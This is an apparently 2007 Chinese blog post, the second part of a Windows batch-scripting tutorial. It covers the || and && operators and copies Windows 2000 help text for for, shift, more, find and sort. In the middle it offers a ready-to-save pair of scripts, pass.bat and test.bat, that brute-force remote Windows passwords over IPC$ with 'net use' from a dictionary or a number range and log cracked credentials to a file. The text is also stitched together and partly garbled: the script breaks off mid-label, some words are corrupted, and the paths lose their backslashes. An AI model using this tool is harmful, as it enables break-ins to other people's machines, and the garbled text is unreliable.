---
title: 批处理教程（2）
description: 接昨天的批处理教程（1）
date: 2007-12-08 01:58:27
category: 教程与电子书
tags: ['动画教程', 'DOS批处理bat']
post_id: 283
alias: processing-batch-tutorial-part2
ViewNums: 4578
---
接昨天的[**批处理教程（1）**](/blog/processing-batch-tutorial-part1)**16、||**

这个命令的用法和&&几乎一样，但作用刚好和它相反：利用这种方法在执行多条命令时，当遇到一个执行正确的命令就退出此命令组合，不再继续执行下面的命令。题目：查看当前目录下是否有以s开头的exe文件，如果有则退出。例十九：

@echo off
dir s*.exe || exit

其实这个例子是有破绽的，你看出来了吗？其实很简单，自己试试就知道了嘛：如果存在那个exe文件，就退出；如果不存在那个exe文件，也退出！为什么？因为如果不存在那个.exe文件，则前一条命令dir s*.exe执行肯定是不成功的，所以就继续执行exit，自然就退出了，呵呵。那么如何解决题目给出的问题呢？看例二十：

@echo off
dir s*.exe || echo Didn't exist file s*.exe & pause & exit

这样执行的结果，就能达到题目的要求，是否存在s*.exe将出现两种结果。这里加暂停的意思，当然是让你能看到echo输出的内容，否则一闪而过的窗口，echo就白写了。

给出两个更好研究优先级（同时也是更难理解）的脚本，仔细研究它们的区别，以便彻底理解各种命令的优先级顺序，对以后自己利用这些命令写脚本有很大的好处----不会出错！OK，请看例二十一和例二十二：
例二十一：

@echo off
dir a.ttt /a & dir a.txt || exit

例二十二：

@echo off
dir a.ttt /a && dir a.txt || exit

警告：患有心脑血管病的朋友请不要研究以上两例，否则轻者头大如斗，重者血管爆裂。任何人由于研究这两个脚本的区别而造成的任何事故由自己或其合法监护人负责，与本人和本论坛无关。特此警告！

有关管道命令和组合命令就大概介绍到这里了，不知道聪明的你是否理解？呵呵，能理解就成天才了，除非你以前就已经掌握！千万别小看了这几个鬼命令，大棒槌是我的说，简直就不是人学的东西！但我还是静下心来研究了一番，最后得出的结论如上所述，已经一点不剩的交给你了，希望你好好收藏并消化吸收，当然有错误被你发现了，或者不完整的地方被你看出来了，请赶紧告诉我一声！

这几个命令真的把我的头都搞大了。在网上有一篇流传很广的批处理教程：“简明批处理教程”，虽然说的比较全面，但看起来很不过瘾。在对for等命令介绍时就一个for /? > a.txt & start a.txt完事了（当然这一点上我不能说人家什么，毕竟我连for /?都没给出），而对上述管道命令和组合命令、以及这篇教程以后将讲到的用批处理好啊作注册表等方面根本没有介绍。我之所以花整整一章来讲管道命令和组合命令，是因为他们才是批处理的精华和灵魂，能否正确利用好这几个命令，是能否掌握批处理的前提条件。如for、set等DOS命令的问题，可以从DOS的角度出发专门有针对性的学习，但有关这几个命令的问题，却是不容易精通掌握的----他们之间的关系太复杂了！
将下列代码存为bat文件
1、如果用字典破解：pass.bat 字典文件路径及名称 主机 用户名
2、如果用数字破解：pass.bat 起始数 步长 结束数 主机 用户名
密码破解出来之后，存放于c:pass.txt文件里面。
将下列代码存为pass.bat文件
@echo off
echo ------------------------------------------------------------------- >>c:pass.txt
echo ------------------------------------------------------------------- >>c:pass.txt
date /t >>c:pass.txt
time /t >>c:pass.txt
echo 破解结果： >>c:pass.txt
if "%6"=="1" goto 大棒槌是我的说2
:大棒槌是我的说1
start "正在破解" /min cmd /c for /f %%i in (%1) do call test.bat %2 "%%i" %3
goto quit
:大棒槌是我的说2
start "正在破解" /min cmd /c for /l %%i in (%1,%2,%3) do call test.bat %4 "%%i" %5
:quit
将下列代码存为test.bat
net use \%1ipc$ %2 /user:"%3"
goto answer%ERRORLEVEL%
rem %ERRORLEVEL%表示取前一命令执行返回结果，net use成功返回0，失败返回2
:answer0
echo 远程主机："%1" >>c:pass.txt
echo 用 户："%3" >>c:pass.txt
echo 密 码：%2 >>c:pass.txt
net use \%1ipc$ /delet
exit
:answer2
For
对一组文件中的每个文件运行指定的命令。

可以在批处理程序中或直接从命令提示符使用 for 命令。

要在批处理程序中使用 for 命令，请使用以下语法：

for %%variable in (set) docommand [command-parameters]

要在命令提示符下使用 for，请使用以下语法：

for %variable in (set) do command [command-parameters]

参数

%%variable 或 %variable

代表可替换的参数。for 命令使用在 set 中指定的每个文本字符串替换 %%variable（或 %variable），直到此命令（在 command-parameters 中指定）处理所有的文件为止。使用 %% variable 在批处理程序中执行 for 命令。使用 % variable 通过命令提示符执行 for 命令。变量名区分大小写。

(set)

指定要用指定的命令处理的一个或多个文件或文本字符串。需要括号。

command

指定要在指定的 set 所包含的每个文件上执行的命令。

command-parameters

指定要用于指定命令（如果指定的命令要使用任何参数或开关）的任何参数或开关。

如果启用了命令扩展（Windows 2000 中的默认设置)，将支持 for 命令的其他形式。
For 命令的其他形式
如果启用了命令扩展，将支持如下 for 命令的其他格式：

只限于目录

for /D [%% | %]variable in (set) docommand [command-parameters]

如果 set 包含通配符（* 和 ?），则指定与目录名匹配，而不是文件名。

递归

for /R [[drive :]path] [%% | %]variable in (set) docommand [command-parameters]

进入根目录树[drive:]path，在树的每个目录中执行 for 语句。如果在 /R 后没有指定目录，则假定为当前目录。如果 set 只是一个句号 (.) 字符，则只列举目录树。

迭代

for /L [%% | %]variable in (start，step，end) do command [command-parameters]

集合是一系列按步长量划分的、从头到尾的数字。这样，(1,1,5) 将生成序列 1 2 3 4 5，而 (5,-1,1) 将生成序列 (5 4 3 2 1)。
文件解析

for /F ["options"] [%% | %]variable in (filenameset) do command [command-parameters]

for /F ["options"] [%% | %]variable in ("literal string") do command[command-parameters]

for /F ["options"] [%% | %]variable in ('command') do command [command-parameters]

或者，如果出现 usebackq 选项：

for /F ["options"] [%% | %]variable in (filenameset) do command [command-parameters]

for /F ["options"] [%% | %]variable in ('literal string') do command [command-parameters]

for /F ["options"] [%% | %]variable in (`command`) docommand [command-parameters]

filenameset 参数指定一个或多个文件名称。在继续到 filenameset 中的下一个文件之前，每个文件都会被打开、读取和处理。

过程由读取文件、分成独立的文本行及然后将每行解析成零个或更多个令牌组成。然后使用设置为找到的一个或多个令牌字符串的变量值（或多个值）集合调用 for 循环体。默认情况下，/F 传递每个文件每一行的第一个空白分隔符号。

跳过空行。通过指定可选的“options”参数可以覆盖默认的解析行为。这是一个引用字符串，它包含一个或多个关键字以指定不同的解析选项。关键字是：

关键字 说明
eol=c 指定行尾注释字符（只一个字符）
skip=n 指定在文件的开头跳过的行数。
delims=xxx 指定定界符集合。这将替换空格和制表符的默认分隔符集。
tokens=x,y,m-n 指定将令牌从每行传递到每个反复的正文。这将导致分配其他变量名。m-n 格式是一个范围，指定从 mth 到 nth 的令牌。如果在令牌 = 字符串中最后一个字符是星号，则将分配附加的变量，并在解析最后一个令牌后在行上接收剩余的文本。
usebackq 指定将右引号字符串作为命令执行，单引号字符串是文字字符串命令，您可以使用双引号包括 filenameset 中的文件名。

变量替换

此外，已经增强了 for 变量引用的替换修改程序。现在可以使用下列可选的语法（对于任何变量 I）：

变量（使用修改程序） 说明
%~I 展开删除了周围的任何引号 (") 的 %I
%~fI 将 %I 展开到完全合格的路径名
%~dI 只将 %I 展开到驱动器号
%~pI 只将 %I 展开到路径
%~nI 只将 %I 展开到文件名
%~xI 只将 %I 展开到文件扩展名
%~sI 展开路径以只包含短名称
%~aI 将 %I 展开到文件的文件属性
%~tI 将 %I 展开到文件的日期/时间
%~zI 将 %I 展开到文件大小
%~$PATH:I 搜索 PATH 环境变量所列出的目录,并将 %I 展开开到第一个找到结果的全部合格名称。如果没有定义环境变量名，或搜索后没有找到文件，则此修改程序将扩展为空字符串。

修改程序可以合并以获得复杂的结果：

变量（使用合并的修改程序） 说明
%~dpI 只将 %I 展开到驱动器号和路径
%~nxI 只将 %I 展开到文件名和扩展名
%~fsI 将 %I 展开到只包含短名称的完整路径名
%~dp$PATH:I 在 PATH 环境变量所列出的目录中搜索 %I，并展开到第一个找到结果的驱动器号和路径
%~ftzaI 将 %I 扩展到与 dir 相似的输出行

注意

在上述范例中，%I 和 PATH 可被其他有效值替换。通过有效的 for 变量名终止 %~ 语法。
使用大写变量名（例如 %I）可以使代码更具可读性，并且避免与不区分大小写的修改程序混淆。
Shift
更改批处理文件中可替换参数的位置。

shift

启用命令扩展（Windows 2000 中的默认设置）后，shift 命令支持 /n 开关，该开关通知命令在第 n 个参数处开始更改，n 可以是从 0 到 8 的任何一个值。例如，

SHIFT /2

将 %3 改为 %2，将 %4 改为 %3 等等，而 %0 和 %1 保持不变。

筛选器命令
筛选器命令可以帮助您排序、查看和选择部分命令输出结果。

通过筛选器命令传递信息

筛选器命令可以划分、重排以及提取通过的部分信息好啊作。Windows 2000 有三个筛选器命令：

more 命令每次显示一屏文件内容或命令输出。
find 命令在文件和命令输出中搜索指定字符。
sort 命令按字母顺序排列文件和命令输出。

要将输入从文件发送到筛选器命令，请使用小于符号 (<)。如果要筛选器命令从其他命令获得输入，请使用管道 (|)。

使用 more 命令来控制屏幕显示

more 命令每次一屏地显示文件的内容或命令输出。例如，下面的 more 命令每次显示一屏 List.txt 文件的内容：

more < list.txt

信息显示一屏后，会出现字“More”。要继续显示下一屏，请按键盘上任意键。要停止命令且不查看详细信息，请按 CTRL+C 键。

如果使用产生多屏输出的命令，more 将十分有用。例如，假设定要查看硬盘的目录树。如果 Windows 2000 不能将目录在一屏内全部显示出来，请使用带管道号 (|) 和 more 命令的 tree 命令，如下例所示：

tree c: | more

tree 命令的第一屏输出被显示，后跟词“More”。Windows 2000 暂停，直到用户按键盘上的任意键为止（PAUSE 键除外）。

使用 find 命令搜索文本

find 命令在一个或多个文件中搜索指定文本。Windows 2000 显示每个包含该文本的行。find 命令可以用作筛选器命令或者标准的 Windows 2000 命令。有关将 find 用作标准的 Windows 2000 命令的信息，请单击“相关主题”列表中的 find。

要将 find 当作筛选器命令使用，请包含小于符号 (<) 和搜索的文件名。当输入文件名时，请记住搜索要区分大小写。例如，下面的命令查找文件 Trade.txt 中所有的“Pacific Rim”字符串：

find "Pacific Rim" < trade.txt

要保存 find 命令的输出而不是显示输出，请使用大于号 (>) 和要存储输出的文件名。例如，下面的命令查找文件 Trade.txt 中所有的“Pacific Rim”字符串，并将结果保存在 Nwtrade.txt 文件中：

find "Pacific Rim" < trade.txt > nwtrade.txt

对文本文件排序

sort 命令按字母顺序排列文本文件或命令的输出。例如，可以使用以下命令对 List.txt 文件的内容进行排序，并在屏幕上显示结果：

sort < list.txt

在此范例中，sort 命令对 List.txt 文件的行进行排序并显示结果，但不更改文件。要保存 sort 命令的输出而不是显示输出，请在命令中包含大于号 (>) 和文件名。例如，可以使用以下命令对 List.txt 文件的行按字母顺序排序，并将结果存到 Alphlist.txt 文件中：

sort < list.txt > alphlist.txt

要排序命令的输出，请键入后面带有管道 (|) 和 sort 命令的命令。例如，下面的命令对 find 命令的输出结果进行排序：

find "Jones" maillst.txt | sort

在键入该命令时，Windows 2000 按字母顺序列出在其中出现“Jones”的行。

带重定向符的合并命令

可以将筛选器命令、其他命令和文件名合并以生成自定义命令。例如，可以使用以下命令存储包含“LOG”字符串的文件名:

dir /b | find "LOG" > loglist.txt

Windows 2000 通过 find 过滤器命令发送 dir 命令的输出并将包含字符串“Log”的文件名存储在 Loglist.txt 文件中。将结果存储为文件名列表（如，A.log、Logdat.svd 和 Mylog.bat）。

要在相同命令中使用多个筛选器，请使用管道 (|) 分隔筛选器。例如，下面的命令搜索 C 盘上的每个目录以查找包含“Log”字符串的文件名，并且每次显示一屏：

dir c: /s /b | find "LOG" | more

因为使用管道 (|)，Windows 2000 通过 find 命令发送 dir 命令的输出结果。find 命令只选择包含字符串“Log”的文件名。more 命令每次一屏地显示 find 命令选择的文件名。
More
每次显示一个输出屏幕。该命令通常用于查看长文件。可以单独使用此命令，或者使用它控制其他命令的输出，例如 type 命令。当显示填充可用的查看区域时将出现 more 提示，用户可以输入许多命令来控制查看文件其余部分的方式。

command name | more [/c] [/p] [/s] [/tn] [+n]

more [[/c] [/p] [/s] [/tn] [+n]] < [drive:][path] filename

more [/c] [/p] [/s] [/tn] [+n] [files]

参数

[drive:][path] filename

指定要显示的文件。

command name

指定将显示其输出的命令。

/c

显示页面前清除屏幕。

/p

扩展换页符。

/s

将多个空白行更改为一个空白行。

/tn

将制表位更改为 n 个空格

+n

显示由 n 指定的行开始的第一个文件。

files

指定要显示的文件列表。用空格分隔文件名。

More 子命令

以下命令在 more 提示 (-- More --) 下接受。

关键字 好啊作
space 显示下一页。
ENTER 显示下一行。
F 显示下一个文件。
q 退出。
? 显示可用命令。
= 显示行号。
P n 显示以下 n 行。
S n 跳过下面 n 行。
Find
在一个文件或多个文件中搜索指定的文本字符串。

当搜索到指定的文件后，find 将显示出包含指定字符串的所有行。

find [/v] [/c] [/n] "string" [[drive:][path]filename[...]]

参数

/v

显示未包含指定字符串的所有行。

/c

只显示包含指定字符串的行数。

/n

将文件行号置于每行开头。

/I

指定搜索不区分大小写。

"string"

指定要搜索的字符组。必须将 string 的文本包括在引号中。

[drive:][path] filename

指定要在其中搜索指定字符串的文件的位置和名称。
Sort
读取输入、排序数据并将结果写到屏幕、文件和其他设备上。

sort [/r] [/+n] [/m kilobytes] [/l locale] [/rec characters] [[drive1:][path1]filename1] [/t [drive2:][path2]] [/o [drive3:][path3]filename3]

[command |] sort [/r] [/+n] [/m kilobytes] [/l locale] [/rec characters] [[drive1:][path1]filename1] [/t [drive2:][path2]] [/o [drive3:][path3]filename3]

参数

/r

颠倒排序顺序，即从 Z 到 A 排序，然后从 9 到 0 排序。

/+n

指定字符位置号 n，sort 在此处开始每次比较。例如，/+3 表示每次比较在每行的第三个字符开始。少于 n 个字符的行在其他行之前排序。默认情况下，比较在每行的第一个字符开始。

/m kilobytes

指定用于排序的主内存数量，按千字节 (KB) 计。使用的内存最小值总是 160 KB。如果指定了内存大小，则无论有多少主内存可用，指定的确切数量（但至少 160 KB）的内存将用于排序。

如果输入输出均为文件，在没有指定大小时，默认最大内存大小为可用主内存的 90％，否则为主内存的 45％。默认设置通常会产生最佳的性能。

/l locale

替代由系统默认区域设置定义的字符排序顺序；即在安装 Windows 2000 时选择的语言和“国家（地区）”。目前，默认区域设置唯一的备用选项就是“C”区域设置，该区域设置比自然语言排序快，根据二进制编码对字符排序。

/rec characters

指定记录或输入文件的行中的最多字符数（默认值为 4096，最大值为 65535）。

[drive1:][path1]filename1

指定要排序的文件。如果没有指定文件名，则对标准输入排序。指定输入文件比将同一文件作为标准输入重定向速度快。

/t [drive2:][path2]
指定保留 sort 命令工作存储的目录路径，防止数据不能装入主内存。默认为使用系统临时目录。
/o [drive3:][path3]filename3
指定要存储排序后的输入的文件。如果没有指定，数据将写入标准输出。指定输出文件比将同一文件作为标准输出重定向速度快!